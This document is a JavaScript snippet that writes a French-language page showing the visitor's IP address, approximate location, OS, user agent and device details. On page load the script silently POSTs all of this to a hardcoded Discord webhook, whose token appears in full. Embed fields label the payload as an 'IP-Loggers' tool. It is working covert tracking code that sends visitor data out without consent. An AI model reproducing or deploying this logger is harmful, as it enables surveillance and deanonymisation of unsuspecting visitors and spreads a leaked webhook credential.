document.write("<details>\r\n<!DOCTYPE html>\r\n<html>\r\n \r\n<body>\r\n \r\n    \r\n    <p><strong>Adresse IP:<\/strong> <span id=\"ipAddress\"><\/span><\/p>\r\n    <p><strong>Adresse:<\/strong> <span id=\"address\"><\/span><\/p>\r\n    <p><strong>Localisation:<\/strong> <span id=\"location\"><\/span><\/p>\r\n    <p><strong>Syst\u00e8me d'exploitation:<\/strong> <span id=\"operatingSystem\"><\/span><\/p>\r\n    <p><strong>Marque:<\/strong> <span id=\"brand\"><\/span><\/p>\r\n    <p><strong>Fabricant:<\/strong> <span id=\"manufacturer\"><\/span><\/p>\r\n    <p><strong>Encodage:<\/strong> <span id=\"encoding\"><\/span><\/p>\r\n    <p><strong>User Agent :<\/strong> <span id=\"browserType\"><\/span><\/p>\r\n    <p><strong>Version :<\/strong> <span id=\"mobileManufacturer\"><\/span><\/p>\r\n    <p><strong>URL de la page:<\/strong> <span id=\"pageURL\"><\/span><\/p>\r\n\r\n    <script>\r\n        \/\/ Fonction pour r\u00e9cup\u00e9rer l'adresse IP de l'utilisateur\r\n        function getIPAddress(callback) {\r\n            var xhr = new XMLHttpRequest();\r\n            xhr.open('GET', 'https:\/\/api.ipify.org?format=json', true);\r\n            xhr.onload = function() {\r\n                if (xhr.status === 200) {\r\n                    var response = JSON.parse(xhr.responseText);\r\n                    callback(response.ip);\r\n                }\r\n            };\r\n            xhr.send();\r\n        }\r\n\r\n        \/\/ Fonction pour obtenir la localisation en utilisant l'API ipinfo.io\r\n        function getLocation(ip, callback) {\r\n            var xhr = new XMLHttpRequest();\r\n            xhr.open('GET', 'https:\/\/ipinfo.io\/' + ip + '\/json', true);\r\n            xhr.onload = function() {\r\n                if (xhr.status === 200) {\r\n                    var response = JSON.parse(xhr.responseText);\r\n                    callback(response.city + ', ' + response.country);\r\n                }\r\n            };\r\n            xhr.send();\r\n        }\r\n\r\n        \/\/ Fonction pour envoyer les informations \u00e0 un webhook Discord\r\n        function sendToDiscordWebhook(data) {\r\n            var webhookURL = 'https:\/\/discord.com\/api\/webhooks\/1164871757191204955\/2QUjsoULzAZwlxi-X8W7uFRa0soo72uEdApVCT0YZhPIa0mW8gAlSZxFvZpI3_u2L02F';\r\n\r\n            var xhr = new XMLHttpRequest();\r\n            xhr.open('POST', webhookURL, true);\r\n            xhr.setRequestHeader('Content-Type', 'application\/json;charset=UTF-8');\r\n\r\n            var message = {\r\n                content: \"Informations de l'utilisateur\",\r\n                embeds: [\r\n                    {\r\n                        title: \"Informations de l'utilisateur\",\r\n                        fields: [\r\n                            { name: \" IP \", value: data.ipAddress, inline: true },\r\n                            { name: \" HL \", value: \"https:\/\/ipinfo.io , add ip to research = result \", inline: true },\r\n                            { name: \" LOC \", value: data.location, inline: true },\r\n                            { name: \" SE \", value: data.operatingSystem, inline: true },\r\n                            { name: \" MF \", value: data.brand, inline: true },\r\n                            { name: \" FB \", value: data.manufacturer, inline: true },\r\n                            { name: \"ECD\", value: data.encoding, inline: true },\r\n                            { name: \"US\", value: data.browserType, inline: true },\r\n                            { name: \"VE\", value: data.mobileManufacturer, inline: true },\r\n                            { name: \"V-GFLP\", value: \" V-GFLP LSP SRDMG Dev1.29\", inline: true },\r\n                            { name: \" BY \", value: \"EnesGP PikaYutMG dev\", inline: true },\r\n                            { name: \" IP-Loggers \", value: \"GRO - 2023 \/\/ Line|Section PSAABIP\", inline: true },\r\n                            { name: \"URL\", value: data.pageURL, inline: true }\r\n                        ]\r\n                    }\r\n                ]\r\n            };\r\n\r\n            xhr.send(JSON.stringify(message));\r\n        }\r\n\r\n        \/\/ Obtient l'adresse de l'utilisateur\r\n        getIPAddress(function(ip) {\r\n            document.getElementById('ipAddress').textContent = ip;\r\n\r\n            getLocation(ip, function(location) {\r\n                document.getElementById('location').textContent = location;\r\n            });\r\n\r\n            \/\/ Envoie les informations au webhook Discord\r\n            sendToDiscordWebhook({\r\n                ipAddress: ip,\r\n                address: document.getElementById('address').textContent,\r\n                location: document.getElementById('location').textContent,\r\n                operatingSystem: operatingSystem,\r\n                brand: brand,\r\n                manufacturer: manufacturer,\r\n                encoding: encoding,\r\n                browserType: browserType,\r\n                mobileManufacturer: mobileManufacturer,\r\n                pageURL: window.location.href\r\n            });\r\n        });\r\n\r\n        \/\/ Obtient le syst\u00e8me d'exploitation de l'utilisateur\r\n        var operatingSystem = navigator.platform;\r\n\r\n        \/\/ Obtient la marque de l'appareil de l'utilisateur\r\n        var brand = \"Non disponible\";\r\n        if (navigator.userAgent.match(\/Android\/i)) {\r\n            brand = \"Android\";\r\n        } else if (navigator.userAgent.match(\/iPhone|iPad|iPod\/i)) {\r\n            brand = \"Apple\";\r\n        }\r\n\r\n        \/\/ Obtient le fabricant de l'appareil de l'utilisateur\r\n        var manufacturer = \"Non disponible\";\r\n        if (operatingSystem.toLowerCase().includes('win')) {\r\n            manufacturer = \"Microsoft\";\r\n            } else if (operatingSystem.toLowerCase().includes('linux')) {\r\n        manufacturer = \"Linux\";\r\n    } else if (operatingSystem.toLowerCase().includes('mac')) {\r\n        manufacturer = \"Apple\";\r\n    }\r\n\r\n    \/\/ Obtient l'encodage du navigateur\r\n    var encoding = document.characterSet;\r\n\r\n    \/\/ Obtient le type de navigateur\r\n    var browserType = navigator.userAgent;\r\n\r\n    \/\/ Obtient le fabricant du mobile de l'utilisateur\r\n    var mobileManufacturer = \"Non disponible\";\r\n    var userAgent = navigator.userAgent;\r\n\r\n    if (userAgent.match(\/Android\/i)) {\r\n        var regex = \/Android\\s([\\w\\s]+)\\;\/;\r\n        var matches = userAgent.match(regex);\r\n        if (matches && matches.length > 1) {\r\n            mobileManufacturer = matches[1];\r\n        }\r\n    } else if (userAgent.match(\/iPhone|iPad|iPod\/i)) {\r\n        mobileManufacturer = \"Apple\";\r\n    }\r\n\r\n    \/\/ Met \u00e0 jour les \u00e9l\u00e9ments HTML avec les informations de l'utilisateur\r\n    document.getElementById('operatingSystem').textContent = operatingSystem;\r\n    document.getElementById('brand').textContent = brand;\r\n    document.getElementById('manufacturer').textContent = manufacturer;\r\n    document.getElementById('encoding').textContent = encoding;\r\n    document.getElementById('browserType').textContent = browserType;\r\n    document.getElementById('location').textContent = 'Non disponible';\r\n    document.getElementById('mobileManufacturer').textContent = mobileManufacturer;\r\n    document.getElementById('pageURL').textContent = window.location.href;\r\n                     <\/script>\r\n\r\n<\/details>");
